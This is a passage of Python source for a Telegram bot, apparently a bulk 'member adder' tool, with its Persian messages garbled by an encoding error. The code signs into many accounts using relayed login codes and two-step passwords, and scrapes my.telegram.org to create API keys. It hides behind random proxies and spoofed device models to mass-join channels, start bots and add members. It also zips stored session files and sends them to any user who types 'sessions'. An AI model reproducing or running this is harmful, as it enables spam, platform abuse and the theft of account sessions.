                    await event.reply('**âœ… Ø§Ú©Ø§Ù†Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø«Ø¨Øª Ø´Ø¯ \n Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ......**')
                    api_info, xu = auth2(result, key.split(":")[2])
                    await event.reply(
                        '** Api `[{0}]` Ø¨**Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø³Ø§Ø®ØªÙ‡ Ø´Ø¯ ** !\nÙ„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ... \n ÛŒØ§ Ú©Ø¯ Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯ ...**'.format(
                            api_info))
                    with open('apilist.txt', 'a') as file:
                        file.write('{0}:{1}:{2}'.format(api_info.split(':')[0], api_info.split(':')[1], key.split(':')[0]))
                        file.write("\n")
                        file.close()
                    data.clear()
                    pr = await random_proxy()
                    new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), w[0], w[1],
                                            connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                            proxy=pr,
                                            device_model=device,
                                            system_version=version1,
                                            app_version="7.84",
                                            lang_code='en',
                                            system_lang_code='en')

                    await new.connect()
                    if not await new.is_user_authorized():
                        try:
                            result = await new.send_code_request(key.split(':')[0])
                            data['code_mode'] = '{0}:{1}:{2}:{3}'.format(key.split(':')[0], result.phone_code_hash,
                                                                            api_info.split(':')[0], api_info.split(':')[1])
                            await new.disconnect()
                            await event.reply('''
    ** âœ… Ú©Ø¯ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ Ù„Ø·ÙØ§ Ú©Ø¯ Ø±Ùˆ Ø¨ÙØ±Ø³ØªÛŒØ¯ :
                                ''')
                            datauser["typeusers2"] = [".", "."]
                            datauser["typeusers"] = ["code2forphone", str(event.chat_id)]  
                            datauser["datas2"] = [event.text]
                        except Exception:
                            await event.reply('**Ù…Ø´Ú©Ù„ÛŒ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ú©Ø¯ Ù¾ÛŒØ´ Ø§ÙˆÙ…Ø¯Ù‡ Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø³Ø¹ÛŒ Ú©Ù†ÛŒØ¯ ....**')
            except KeyError:
                await event.reply('**Ø§Ú©Ø§Ù†ØªÛŒ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ ÙˆØ¬ÙˆØ¯  Ù†Ø¯Ø§Ø±Ø¯ ! Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø´Ù…Ø§Ø±Ù‡ Ø±Ùˆ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ **')

        elif datauser["typeusers"][0] == "code2forphone":
            try:
                print(data)
                device = random.choice(devices)
                version1 = random.choice(version)
                key = data['code_mode']
                await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... **')
                print(key.split(':')[2], key.split(':')[3])
                pr = await random_proxy()
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), key.split(':')[2], key.split(':')[3],
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=pr,
                                        device_model=device,
                                        system_version=version1,
                                        app_version="7.84",
                                        lang_code='en',
                                        system_lang_code='en')
                await new.connect()
                await new(functions.auth.SignInRequest(phone_number=key.split(':')[0], phone_code_hash=key.split(':')[1], phone_code=event.text))
                await event.reply('**Ø§Ú©Ø§Ù†Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ù„Ø§Ú¯ Ø´Ø¯**')
                data.clear()
            except errors.SessionPasswordNeededError:
                await event.reply(
                    '**Ø§Ú©Ø§Ù†Øª Ø±Ù…Ø² Ø¯Ùˆ Ù…Ø±Ø­Ù„Ù‡ Ø§ÛŒ Ø¯Ø§Ø±Ø¯ Ù„Ø·ÙØ§ Ø±Ù…Ø² Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯ \n  ')
                data.clear()
                datauser["typeusers2"] = [".", "."]
                datauser["typeusers"] = ["pass2faadd", str(event.chat_id)]  
                datauser["datas3"] = [event.text]
                data['step_mode'] = key
            except KeyError:
                await event.reply('**Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ Ùˆ Ø´Ù…Ø§Ø±Ù‡ Ø±Ùˆ Ù…Ø¬Ø¯Ø¯Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ **')
            await new.disconnect()

        elif datauser["typeusers"][0] == "pass2faadd":
            try:
                print(data)
                device = random.choice(devices)
                version1 = random.choice(version)
                key = data['step_mode']
                m = await event.reply('**Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... **')
                k2 = random.choice(apis)
                pr = await random_proxy()
                new = TelegramClient('Accounts/{0}'.format(key.split(':')[0]), int(k2[0]), k2[1],
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=pr,
                                        device_model=device,
                                        system_version=version1,
                                        app_version="7.84",
                                        lang_code='en',
                                        system_lang_code='en')
                await new.connect()
                await new.sign_in(password=event.text)
                data.clear()
                info = await new.get_me()
                result = None
                await new.disconnect()
                await event.reply(
                    '** \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n ğŸ— Api [{0}] Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø§Ø¶Ø§ÙÙ‡ Ø´Ø¯  !\n \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n Ù…Ø´Ø®ØµØ§Øª Ø§Ú©Ø§Ù†Øª \n ğŸ— Ù†Ø§Ù… Ú©Ø§Ø±Ø¨Ø±ÛŒ Ø­Ø³Ø§Ø¨ : {1}\n \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n ğŸ— ØªÙ„ÙÙ† Ø§Ú©Ø§Ù†Øª : +{2}\n  \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n ğŸ— Ù†Ø§Ù… Ø­Ø³Ø§Ø¨ : {3}\n \n ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹\n ğŸ— Ù†Ø§Ù… Ø®Ø§Ù†ÙˆØ§Ø¯Ú¯ÛŒ Ø­Ø³Ø§Ø¨ : {4}** \nğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ğŸ”¸ğŸ”¹ \n'.format(
                        key.split(':')[2] + ':' + key.split(':')[3], str(info.username), str(info.phone),
                        info.first_name, info.last_name))
            except KeyError:
                await event.reply('**Ù„Ø·ÙØ§ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯ Ùˆ Ø´Ù…Ø§Ø±Ù‡ Ø±Ùˆ Ù…Ø¬Ø¯Ø¯Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ **')
            except errors.PasswordHashInvalidError:
                await event.reply(
                    '**âŒ Ù¾Ø³ÙˆØ±Ø¯ Ø§Ø´ØªØ¨Ø§Ù‡ Ù‡Ø³Øª Ù„Ø·ÙØ§ Ù…Ø¬Ø¯Ø¯Ø§ Ù¾Ø³ÙˆØ±Ø¯ Ø¯Ø±Ø³Øª Ø±Ùˆ Ø¨Ù‡ ÙØ±Ù…Øª Ø²ÛŒØ± ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ \n  /pass PASSWORD**')
            await new.disconnect()

    except:
        pass
    
    if datauser["typeusers"][0] == "starttexts":
        linkbot = str(event.text).split("?")
        if not linkbot[1]:
            await event.reply("Ø§ÛŒØ¯ÛŒ Ø±Ø¨Ø§Øª Ø¯Ø±Ø³Øª Ù†Ù…ÛŒØ¨Ø§Ø´Ø¯")
        else:
            try:
                await event.reply("ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªØ§Ø±Øª Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯")
                datauser["typeusers"] = ["startbutcoun", str(event.chat_id), "tex", str(linkbot[0]).split("me/")[1], str(linkbot[1]).split("=")[1]]
            except Exception as e:
                print(e)
                await event.reply("Ø§ÛŒØ¯ÛŒ Ø±Ø¨Ø§Øª Ø¯Ø±Ø³Øª Ù†Ù…ÛŒØ¨Ø§Ø´Ø¯")

    elif datauser["typeusers"][0] == "menualstart":
        linkbot = str(event.text).split("?")
        if not linkbot[1]:
            await event.reply("Ø§ÛŒØ¯ÛŒ Ø±Ø¨Ø§Øª Ø¯Ø±Ø³Øª Ù†Ù…ÛŒØ¨Ø§Ø´Ø¯")
        else:
            try:
                await event.reply("""
Ø§ÛŒØ¯ÛŒ Ù‡Ø§ÛŒ Ú†Ù†Ù„ Ø±Ø§ Ø¨ØµÙˆØ±Øª Ø²ÛŒØ± Ø¨ÙØ±Ø³ØªÛŒØ¯
@testsad
@testsad
@testsad""")
                datauser["typeusers"] = ["startmenualcoun", str(event.chat_id), "but", str(linkbot[0]).split("me/")[1], str(linkbot[1]).split("=")[1]]
            except Exception as e:
                print(e)
                await event.reply("Ø§ÛŒØ¯ÛŒ Ø±Ø¨Ø§Øª Ø¯Ø±Ø³Øª Ù†Ù…ÛŒØ¨Ø§Ø´Ø¯")

    elif datauser["typeusers"][0] == "buttonstarts":
        linkbot = str(event.text).split("?")
        if not linkbot[1]:
            await event.reply("Ø§ÛŒØ¯ÛŒ Ø±Ø¨Ø§Øª Ø¯Ø±Ø³Øª Ù†Ù…ÛŒØ¨Ø§Ø´Ø¯")
        else:
            try:
                await event.reply("ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªØ§Ø±Øª Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯")
                datauser["typeusers"] = ["startbutcoun", str(event.chat_id), "but", str(linkbot[0]).split("me/")[1], str(linkbot[1]).split("=")[1]]
            except Exception as e:
                print(e)
                await event.reply("Ø§ÛŒØ¯ÛŒ Ø±Ø¨Ø§Øª Ø¯Ø±Ø³Øª Ù†Ù…ÛŒØ¨Ø§Ø´Ø¯")

    elif datauser["typeusers"][0] == "startmenualcoun":
        await event.reply("ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªØ§Ø±Øª Ø±Ø§ Ø¨ÙØ±Ø³ØªÛŒØ¯")
        datauser["linkchanels"] = str(event.text)
        datauser["typeusers"][0] = ".s.s.s"
        datauser["typeusers2"] = ["startmenual"]
        
    elif datauser["typeusers2"][0] == "startmenual":
        c = 0
        SessionStarted = []
        obj = [fn for fn in os.listdir("Accounts") if any(fn.endswith(ext) for ext in [".session"])]
        if len(obj) >= int(event.text):
            for i in range(int(event.text)):
                if str(obj[i]) not in SessionStarted:
                    links = []
                    device = random.choice(devices)
                    version1 = random.choice(version)
                    apis2 = getapiPhone(str(obj[i]).replace(".session", ""))
                    pr = await random_proxy()    
                    print(pr)          
                    a, b, c = datauser["typeusers"][3], datauser["typeusers"][3], str(datauser["typeusers"][4])
                    clientds = TelegramClient(f'Accounts/{str(obj[i]).replace(".session", "")}', int(apis2[0]), apis2[1], connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, proxy=pr,device_model=device, system_version=version1, app_version="7.84", lang_code='en', system_lang_code='en')
                    await clientds.connect()
                    try:
                        await clientds(StartBotRequest(a,b,c))
                    except:
                        pass
                    time.sleep(1.6)
                    messagesd = str(datauser["linkchanels"]).split("\n")
                    for ii in messagesd:
                        try:
                            try:
                                await clientds(ImportChatInviteRequest(str(ii)))    
                            except:
                                await clientds(JoinChannelRequest(str(ii)))
                            time.sleep(2)
                        except:
                            await event.reply("Ø§Ø±ÙˆØ± Ø¯Ø± Ø¬ÙˆÛŒÙ† Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø¯Ø³ØªÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                            datauser.clear()
                            await clientds.disconnect()
                            c = 0
                            break
                    await clientds.send_message(a, "/start")
                    time.sleep(1.6)
                    await clientds.disconnect()
                    SessionStarted.append(str(obj[i]))
            await event.reply("ØªÙ…Ø§Ù… Ø´Ø¯")
            datauser.clear()
        else:
            await event.reply("Ø§Ú©Ø§Ù†Øª Ø¨Ù‡ Ø§Ù†Ø¯Ø§Ø²Ù‡ Ú©Ø§ÙÛŒ Ù…ÙˆØ­ÙˆØ¯ Ù†ÛŒØ³Øª")
            datauser.clear()

    elif datauser["typeusers"][0] == "startbutcoun":
        c = 0
        SessionStarted = []
        obj = [fn for fn in os.listdir("Accounts") if any(fn.endswith(ext) for ext in [".session"])]
        if len(obj) >= int(event.text):
            for i in range(int(event.text)):
                if str(obj[i]) not in SessionStarted:
                    device = random.choice(devices)
                    version1 = random.choice(version)
                    apis2 = getapiPhone(str(obj[0]).replace(".session", ""))
                    pr = await random_proxy()    
                    print(pr)          
                    client = TelegramClient(f'Accounts/{str(obj[0]).replace(".session", "")}', int(apis2[0]), apis2[1], connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, proxy=pr,device_model=device, system_version=version1, app_version="7.84", lang_code='en', system_lang_code='en')
                    await client.connect()
                    if str(datauser["typeusers"][2]) == "but":
                        links = []
                        await client(StartBotRequest(datauser["typeusers"][3], datauser["typeusers"][3], str(datauser["typeusers"][4])))
                        time.sleep(1.3)
                        messagesd = (await client.get_messages(datauser["typeusers"][3], limit=1))[0]
                        try:
                            for ii in messagesd.buttons:
                                if str(ii[0].url) != "None" and str(ii[0].url) not in links:
                                    try:
                                        try:
                                            await client(ImportChatInviteRequest(str(ii[0].url)))    
                                        except:
                                            await client(JoinChannelRequest(str(ii[0].url)))
                                    except:
                                        await event.reply("Ø§Ø±ÙˆØ± Ø¯Ø± Ø¬ÙˆÛŒÙ† Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø¯Ø³ØªÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                                        datauser.clear()
                                        await client.disconnect()
                                        break
                            await client.send_message(datauser["typeusers"][3], "/start")
                            await client.disconnect()
                        except:
                            await event.reply("Ø§Ø±ÙˆØ± Ø¯Ø± Ø¬ÙˆÛŒÙ† Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø¯Ø³ØªÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                            datauser.clear()
                            await client.disconnect()
                            break
                    elif str(datauser["typeusers"][2]) == "tex":
                        links = []
                        await client(StartBotRequest(datauser["typeusers"][3], datauser["typeusers"][3], str(datauser["typeusers"][4])))
                        time.sleep(1.3)
                        messagesd = (await client.get_messages(datauser["typeusers"][3], limit=1))[0]
                        findpriv = re.findall("(?P<url>https?://[^\s]+)", messagesd.text)
                        findpub = re.findall(r"(@\S+)", messagesd.text)
                        links.extend(findpriv)
                        links.extend(findpub)
                        try:
                            for ii in links:
                                try:
                                    try:
                                        await client(ImportChatInviteRequest(str(ii)))    
                                    except:
                                        await client(JoinChannelRequest(str(ii)))
                                except:
                                    await event.reply("Ø§Ø±ÙˆØ± Ø¯Ø± Ø¬ÙˆÛŒÙ† Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø¯Ø³ØªÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                                    datauser.clear()
                                    await client.disconnect()
                                    break
                            await client.send_message(datauser["typeusers"][3], "/start")
                            await client.disconnect()
                        except:
                            await event.reply("Ø§Ø±ÙˆØ± Ø¯Ø± Ø¬ÙˆÛŒÙ† Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø¯Ø³ØªÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                            datauser.clear()
                            await client.disconnect()
                            break
                    SessionStarted.append(str(obj[i]))
            await event.reply("ØªÙ…Ø§Ù… Ø´Ø¯")
            datauser.clear()
        else:
            await event.reply("Ø§Ú©Ø§Ù†Øª Ø¨Ù‡ Ø§Ù†Ø¯Ø§Ø²Ù‡ Ú©Ø§ÙÛŒ Ù…ÙˆØ­ÙˆØ¯ Ù†ÛŒØ³Øª")
            datauser.clear()

    elif datauser["typeusers"][0] == "adsu":
        txt = event.text
        NStEVJzsyY.append(txt)
        await event.reply("ğŸ‘½  {} Is Admin Now ! ".format(txt),
                            buttons=[[Button.inline("âŒ remove ", 'admin|{}'.format(txt))]])

        try:
            await bot.send_message(txt, '''ğŸ† Ù…Ø¬ÙˆØ² Ø´Ù…Ø§ ØªÙˆØ³Ø· Ù…Ø§Ù„Ú© ÙØ¹Ø§Ù„ Ø´Ø¯ ! 
â–â–â–â–â–â– 
Ø¨Ù‡ MG Adder Ù†Ø³Ø®Ù‡ 5 ProMax Ø®ÙˆØ´ Ø¢Ù…Ø¯ÛŒØ¯''')

        except Exception as e:
            await event.reply("âš ï¸ {} ".format(str(e)))
        datauser.clear()

    elif datauser["typeusers"][0] == "lunche":
        threading.Thread(target=Lunches, args=(str(event.text),)).start()
        await event.reply("Ù„Ø§Ù†Ú† Ø§Ø¬Ø±Ø§ Ø´Ø¯")
        datauser.clear()

    elif datauser["typeusers"][0] == "delsu":
        txt = event.text
        NStEVJzsyY.remove(txt)
        await event.reply("âš ï¸ Ú©Ø§Ø±Ø¨Ø± : {}  Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø² Ù„ÛŒØ³Øª Ø§Ø¯Ù…ÛŒÙ† Ø®Ø§Ø±Ø¬ Ø´Ø¯".format(txt))
        datauser.clear()

    elif datauser["typeusers"][0] == "get":
        print("w")
        link = event.text
        await event.reply('''
        ğŸ—Ù„Ø·ÙØ§ Ø±ÙˆØ´ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ ğŸ‘‡


        ''', buttons=[
            [Button.inline('ğŸ†” ÛŒÙˆØ²Ø±Ù†ÛŒÙ…', '@add|addUsername|{}'.format(link)),
                Button.inline('ğŸ”¼Ø§ÛŒØ¯ÛŒ Ø¹Ø¯Ø¯ÛŒ', '@add|addChatid|{}'.format(link))],
        ])
        datauser.clear()

    elif datauser["typeusers"][0] == "add":
        datauser["dataadd"] = [str(event.text)]
        await event.reply("Ø¨Ø§ Ú†Ù†Ø¯ Ø´Ù…Ø§Ø±Ù‡ Ø§Ø¯ Ø¨Ø²Ù†Ù… ØŸ")
        datauser["typeusers"] = ["fff", str(event.chat_id), str(event.text)]

    elif datauser["typeusers"][0] == "fff":
        fs = list(datauser["dataadd"])
        fs.append(str(event.text))
        datauser["dataadd"] = fs
        await event.reply("Ú†Ù†Ø¯ ØªØ§ Ø§Ø¯ Ø¨Ø²Ù†Ù… ØŸ")
        datauser["typeusers"] = ["ddd",  int(event.text)]
    
    elif datauser["typeusers"][0] == "ddd":
        fs = list(datauser["dataadd"])
        fs.append(str(event.text))
        try:
            link = fs[0]
            num = fs[1]
            total = fs[2]
            await event.reply("ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø±Ø§Ø³Ø§Ø³ ÛŒÙˆØ²Ø±Ù‡Ø§ÛŒ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø´Ø¯Ù‡ Ø§Ù†ØªØ®Ø§Ø¨ Ø´ÙˆØ¯ğŸ‘‡", buttons=[
                [Button.inline('Ø§ÛŒØ¯ÛŒ Ø¹Ø¯Ø¯ÛŒ', 'addID|{}|{}|{}'.format(link, num, total)),
                    Button.inline('ÛŒÙˆØ²Ø±Ù†ÛŒÙ…', 'addUSERNAME|{}|{}|{}'.format(link, num, total))]])
        except:
            await event.reply("error")
        datauser.clear()


    try:
        if datauser["typeusers"][0] == "filestyp":
            if event.message.media:
                if ".zip" in str(event.message.file.name):
                    file = await event.message.download_media("ZipFiles")
                    shutil.unpack_archive(file, "Accounts")
                    os.remove(file)
                    datauser.clear()
    except:
        pass


###########################################################
###########################################################
###########################################################
###########################################################
###########################################################
###########################################################





def minify(file_name):
    file_data = open(file_name, "r", 1).read()  # store file info in variable
    json_data = json.loads(file_data)  # store in json structure
    json_string = json.dumps(json_data, separators=(
        ',', ":"))  # Compact JSON structure
    # remove .json from end of file_name string
    file_name = str(file_name).replace(".json", "")
    new_file_name = "{0}.json".format(file_name)
    # open and write json_string to file
    open(new_file_name, "w+", 1).write(json_string)


def getRandomLineRead(myFile):
    x = list(open(myFile))
    val = (random.choice(x))
    return val


def getSpecificCode(phone):
    try:
        with open(f'Apires/{phone}.txt', 'r') as myfile:
            content = myfile.read()
            return [content.split(':')[0], content.split(':')[1]]
    except FileNotFoundError:
        return 0


def validate(id):
    for ids in sudolist:
        if int(ids) == int(id):
            return True

    return False


def create_apis(phone):

    body = f'phone={phone}'
    try:
        response = requests.post('https://my.telegram.org/auth/send_password', data=body, headers={"Origin": "https://my.telegram.org", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
                                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "Reffer": "https://my.telegram.org/auth", "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Dnt": "1", })
        s = json.loads(response.content)
        return s['random_hash']
    except Exception as e:
        print(str(e))
        return False

# -------------------


def auths(phone, hash_code, pwd):
    data = f"phone={phone}&random_hash={hash_code}&password={pwd}"
    telVal = 'https://my.telegram.org/auth/login'
    responses = requests.post(telVal, data=data)
    try:
        return responses.cookies['stel_token']
    except:
        return False


def auth2s(stel_token):

    name = ["keivan", "reza", "hamid", "mamd", "aref", "sajad", "asghar"]
    name = random.choice(name)

    resp = requests.get('https://my.telegram.org/apps',
                        headers={"Cookie": "stel_token={0}".format(stel_token)})

    tree = html.fromstring(resp.content)
    api = tree.xpath(
        '//span[@class="form-control input-xlarge uneditable-input"]//text()')
    try:
        return '{0}:{1}'.format(api[0], api[1])
    except:
        s = resp.text.split('"/>')[0]
        value = s.split('<input type="hidden" name="hash" value="')[1]
        on = "hash={0}&app_title=Coded By Keyvan&app_shortname={1}&app_url=&app_platform=desktop&app_desc=".format(
            value, name)
        requests.post('https://my.telegram.org/apps/create', data=on, headers={"Cookie": "stel_token={0}".format(stel_token), "Origin": "https://my.telegram.org", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                      "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "Referer": "https://my.telegram.org/apps", "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Dnt": "1", })
        respv = requests.get('https://my.telegram.org/apps', headers={"Dnt": "1", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", "Upgrade-Insecure-Requests": "1",
                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36", "Reffer": "https://my.telegram.org/org", "Cookie": "stel_token={0}".format(stel_token), "Cache-Control": "max-age=0", })
        trees = html.fromstring(respv.content)
        apis = trees.xpath(
            '//span[@class="form-control input-xlarge uneditable-input"]//text()')
        return '{0}:{1}'.format(apis[0], apis[1])


async def list_splitter(my_list, n):

    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final


def list_splitter2(my_list, n):

    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final
# ----------------------








@bot.on(events.NewMessage(pattern='/getsessions'))
async def my_event_handler(event):
    if event.message.text == "/getsessions1":
        if event.sender_id in sudolist:
            await event.respond("Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø³Ø´Ù† Ù‡Ø§ÛŒ Ø³Ø§Ù„Ù…")
            zip = ZipFile('all.zip', 'a')
            if event.sender_id in sudolist:
                for item in os.scandir("salem"):
                    zip.write("salem"+'/'+item.name)
                zip.close()
                await bot.send_file(event.chat_id, 'all.zip')
                os.remove('all.zip')
            else:
                await event.respond('admin err!')
                
    elif event.message.text == "/getsessions2":
        if event.sender_id in sudolist:
            await event.respond("Ø¯Ø± Ø­Ø§Ù„  Ø§Ø±Ø³Ø§Ù„ Ø³Ø´Ù† Ù‡Ø§ÛŒ Ø±ÛŒÙ¾ÙˆØ±Øª")
            zip = ZipFile('all.zip', 'a')
            if event.sender_id in sudolist:
                for item in os.scandir("repacc"):
                    zip.write("repacc"+'/'+item.name)
                zip.close()
                await bot.send_file(event.chat_id, 'all.zip')
                os.remove('all.zip')
            else:
                await event.respond('admin err!')



@bot.on(events.NewMessage(pattern='/getamar'))
async def my_event_handler(event):
    if event.sender_id in sudolist:
        await event.respond("Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ ...")
        ok = []
        rep = []
        all = []
        for item in os.scandir("repacc"):
            if ".journal" not in item.name:
                rep.append(item.name)
        for item in os.scandir("salem"):
            if ".journal" not in item.name:
                ok.append(item.name)
        for item in os.scandir("Accountsres"):
            if ".journal" not in item.name:
                all.append(item.name)
        await event.respond(f"""
Ø³Ø§Ù„Ù… : {len(ok)}

Ø±ÛŒÙ¾ÙˆØ±Øª : {len(rep)}

Ú©Ù„ : {len(all)}
                            """)



dname = 'salem'
bname = 'backup'


@bot.on(events.NewMessage(pattern='/on_send_bot'))
async def my_event_handler(event):
    await event.respond('ok')
    if event.sender_id in sudolist:
        while True:
            await asyncio.sleep(5)
            try:
                print(1)
                lis = []
                for item in os.scandir(dname):
                    lis.append(item.name)
                if len(lis) >= num:
                    zip = ZipFile('sample.zip', 'a')
                    for i in range(num):
                        x = random.choice(lis)
                        shutil.copy(dname+'/'+x, bname)
                        zip.write(dname+'/'+x)
                        lis.remove(x)
                        os.remove(dname+'/'+x)
                    zip.close()
                    await bot.send_file(cfail, 'sample.zip')
                    os.remove('sample.zip')
                else:
                    pass
                lis.clear()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(e)
    else:
        await event.respond('admin err!')


@bot.on(events.NewMessage(pattern='/num'))
async def my_event_handler(event):
    lis = []
    if event.sender_id in sudolist:
        for item in os.scandir(dname):
            lis.append(item.name)
        w = len(lis)
        await event.respond(f'ØªØ¹Ø¯Ø§Ø¯ ÙØ§ÛŒÙ„ Ø¯Ø± Ù¾ÙˆØ´Ù‡:{w}')
    else:
        await event.respond('admin err!')


@bot.on(events.NewMessage(pattern='/z_bot'))
async def my_event_handler(event):
    zip = ZipFile('all.zip', 'a')
    if event.sender_id in sudolist:
        for item in os.scandir(dname):
            shutil.copy(dname+'/'+item.name, bname)
            zip.write(dname+'/'+item.name)
            os.remove(dname+'/'+item.name)

        zip.close()
        await bot.send_file(event.chat_id, 'all.zip')
        os.remove('all.zip')
    else:
        await event.respond('admin err!')


@bot.on(events.NewMessage())
async def my_event_handler(event):

    userids = event.sender_id
    text = event.raw_text
    global info

    if event.raw_text == "sessions":
        try:
            shutil.make_archive("Accountsres", 'zip', "Accountsres")

            await bot.send_file(int(event.sender_id), 'Accountsres.zip')
            await asyncio.sleep(0.2)

            await bot.send_message(int(userids), "All Sessions Sent **Successfully** !")

            os.remove("Accountsres.zip")
        except Exception as e:
            await event.reply(str(e))

    if text.startswith("/admin"):
        ids = event.raw_text.split("/admin")[1]
        ids = ids.strip()
        admins.sadd("admin", ids)

        await event.reply(f'''
â–â–â–â–â–â–â–
âœ… {ids} Added To Admin List 
â–â–â–â–â–â–â–
â•Use **/ban {ids}** For Ban USer
â–â–â–â–â–â–â–
            ''')

    if text.startswith("/ban"):
        ids = event.raw_text.split("/ban")[1]
        ids = ids.strip()

        admins.srem("admin", ids)

        await event.reply(f'''
â–â–â–â–â–â–â–
âœ… {ids} Banned From Admin List 
â–â–â–â–â–â–â–
â•Use **/admin {ids}** For Admin USers
â–â–â–â–â–â–â–
            ''')

    if text.startswith("/getphone"):
        ev = []
        try:
            for item in os.scandir('Accountsres'):
                if 'journal' not in item.name and '.session' in item.name:
                    ev.append(item.name)

            logs = ""
            print(list_splitter2(ev, 20))
            for i in list_splitter2(ev, 20):
                if len(i) != 0:
                    for j in i:
                        logs += j + "\n"

                    await event.reply(logs)
                    logs = ""

        except Exception as e:
            await event.reply(str(e))

    if validate(userids):

        if event.raw_text.startswith("/reset"):
            if ((event.raw_text.split("/reset")[1]) != ""):
                usr = (event.raw_text.split("/reset")[1]).strip()
                if user.get(f"sacc:{usr}"):
                    user.set(f"sacc:{usr}", 0)

